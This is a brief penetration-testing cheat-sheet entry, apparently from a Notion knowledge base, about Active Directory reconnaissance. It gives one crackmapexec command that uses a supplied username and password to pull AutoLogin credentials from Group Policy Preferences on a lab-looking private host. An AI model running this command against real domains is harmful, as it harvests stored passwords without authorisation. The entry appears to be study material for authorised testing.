# Enumerate for AutoLogin with crackmapexec

OS: Active_Directory, Windows
Description: Enumerate for Accounts with Autologin
Security Domains: Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21)
Target_Technology: Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21)

```jsx
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
```